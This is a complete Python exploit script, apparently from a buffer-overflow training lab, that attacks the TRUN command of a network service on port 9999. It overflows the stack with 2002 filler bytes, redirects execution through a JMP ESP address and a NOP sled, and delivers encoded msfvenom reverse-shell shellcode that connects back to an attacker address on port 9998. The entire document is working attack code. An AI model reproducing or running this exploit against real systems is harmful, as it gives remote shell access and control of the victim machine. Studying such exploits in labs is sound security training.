#!/usr/bin/python
# COMPLETE #
import socket

#7C86CED9   FFE4             JMP ESP
offset = "\xd9\xce\x86\x7c"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.58 LPORT=9998 -v shell -e x86/shikata_ga_nai -b "\x00" -f python
#Payload size: 351 bytes
shell =  ""
shell += "\x90\x90\xdb\xdd\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\xbe\x40"
shell += "\x02\xcb\xb1\x31\x72\x17\x03\x72\x17\x83\x82\x06\x29"
shell += "\x44\xfe\xef\x2f\xa7\xfe\xef\x4f\x21\x1b\xde\x4f\x55"
shell += "\x68\x71\x60\x1d\x3c\x7e\x0b\x73\xd4\xf5\x79\x5c\xdb"
shell += "\xbe\x34\xba\xd2\x3f\x64\xfe\x75\xbc\x77\xd3\x55\xfd"
shell += "\xb7\x26\x94\x3a\xa5\xcb\xc4\x93\xa1\x7e\xf8\x90\xfc"
shell += "\x42\x73\xea\x11\xc3\x60\xbb\x10\xe2\x37\xb7\x4a\x24"
shell += "\xb6\x14\xe7\x6d\xa0\x79\xc2\x24\x5b\x49\xb8\xb6\x8d"
shell += "\x83\x41\x14\xf0\x2b\xb0\x64\x35\x8b\x2b\x13\x4f\xef"
shell += "\xd6\x24\x94\x8d\x0c\xa0\x0e\x35\xc6\x12\xea\xc7\x0b"
shell += "\xc4\x79\xcb\xe0\x82\x25\xc8\xf7\x47\x5e\xf4\x7c\x66"
shell += "\xb0\x7c\xc6\x4d\x14\x24\x9c\xec\x0d\x80\x73\x10\x4d"
shell += "\x6b\x2b\xb4\x06\x86\x38\xc5\x45\xcf\x8d\xe4\x75\x0f"
shell += "\x9a\x7f\x06\x3d\x05\xd4\x80\x0d\xce\xf2\x57\x71\xe5"
shell += "\x43\xc7\x8c\x06\xb4\xce\x4a\x52\xe4\x78\x7a\xdb\x6f"
shell += "\x78\x83\x0e\x3f\x28\x2b\xe1\x80\x98\x8b\x51\x69\xf2"
shell += "\x03\x8d\x89\xfd\xc9\xa6\x20\x04\x9a\x08\x1c\x0c\x60"
shell += "\xe1\x5f\x10\xb3\xff\xd6\xf6\xd1\xef\xbe\xa1\x4d\x89"
shell += "\x9a\x39\xef\x56\x31\x44\x2f\xdc\xb6\xb9\xfe\x15\xb2"
shell += "\xa9\x97\xd5\x89\x93\x3e\xe9\x27\xbb\xdd\x78\xac\x3b"
shell += "\xab\x60\x7b\x6c\xfc\x57\x72\xf8\x10\xc1\x2c\x1e\xe9"
shell += "\x97\x17\x9a\x36\x64\x99\x23\xba\xd0\xbd\x33\x02\xd8"
shell += "\xf9\x67\xda\x8f\x57\xd1\x9c\x79\x16\x8b\x76\xd5\xf0"
shell += "\x5b\x0e\x15\xc3\x1d\x0f\x70\xb5\xc1\xbe\x2d\x80\xfe"
shell += "\x0f\xba\x04\x87\x6d\x5a\xea\x52\x36\x6a\xa1\xfe\x1f"
shell += "\xe3\x6c\x6b\x22\x6e\x8f\x46\x61\x97\x0c\x62\x1a\x6c"
shell += "\x0c\x07\x1f\x28\x8a\xf4\x6d\x21\x7f\xfa\xc2\x42\xaa"

# Sends a unique string to the remote host.
payload = "\x41" * 2002 + offset + "\x90" * 8 + shell 

buffer = "TRUN /.:/ "
buffer+=payload

print "Sending Evil Buffer!"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
s.recv(1024)
s.send(buffer)
s.close()
